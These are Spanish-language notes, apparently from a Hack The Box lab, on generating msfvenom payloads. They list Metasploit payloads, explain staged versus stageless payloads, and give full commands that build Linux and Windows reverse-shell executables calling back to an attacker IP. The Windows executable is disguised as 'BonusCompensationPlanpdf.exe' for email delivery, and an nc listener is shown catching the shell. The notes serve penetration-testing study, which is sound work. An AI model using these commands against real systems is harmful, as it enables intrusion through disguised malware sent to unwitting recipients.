Atacar a una máquina con *msfconsole* (metasploit) es útil siempre y cuando la máquina atacante tiene visibilidad de la máquina víctima (que estén en la misma red).

Cuando no se dispone de este acceso, conviene saber otras formas de entregar dicho PAYLOAD. 
La solución es utilizar *msfvenom* para crear un archivo maliciosos que se peuda enviar por correo u otro método para su posterior ejecución.

### Practicando con msfvenom
En la máquina atacante, podemos utilizar el comando:
```
msfvenom -l payloads
```
para listar la totalidad de payloads disponibles.

Estos son algunos ejemplos: 

```shell-session
Polika4RM@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point.
```

## Tipos de PAYLOADS
Existen dos tipos de PAYLOADS, los staged y los stageless:

Los **payloads staged** se envían en varias etapas: primero una pequeña parte que se ejecuta en la máquina víctima y luego descarga el resto del payload, lo que permite ataques más grandes o complejos, pero puede consumir más memoria y ser inestable en redes lentas.  El “resto del payload” no está en la máquina víctima desde el principio; se envía después a través de la red cuando la primera etapa ya abrió el canal de comunicación. Esto permite que el atacante envíe payloads grandes en partes más pequeñas y controladas

Por otro lado, los **payloads stageless** se envían completos de una sola vez, lo que los hace más estables y menos detectables en redes con poca banda, aunque limita el tamaño del payload. En 
- Los staged separan las etapas con barras (`/`) :
	- Ejemplo: linux/x86/shell/reverse_tcp
- Mientras que los stageless presentan todo en un solo bloque.
	- Ejemplo: linux/zarch/meterpreter_reverse_tcp


# Creando un Stageless Payload
Vamos a construir un stageless payload.

El comando completo es el siguiente:
```shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
- **msfvenom**: define la herramienta a utilizar
- **-p**: Indica a msfvenom que se debe crear un PAYLOAD.
- **linux/x64/shell_reverse_tcp**: indica a msfvenom el tipo de PAYLOAD a generar según la arquitectura de la víctima.
- **LHOST // LPORT**: Indica el Local Host y Port del atacante. 
- **-f efl**: indica que el payload se encapsulará en un 
- **>createbackup.elf**: indica el nombre del archivo a la salida.


Para un sistema windows, el comando utilizado poddría ser un de este tipo:
```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

En ambos payloads, nos tendríamos que poner en escucha por el puerto indicado en LPORT para recibir la *REVERSE SHELL*: 
```shell-session
Polika4RM@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```
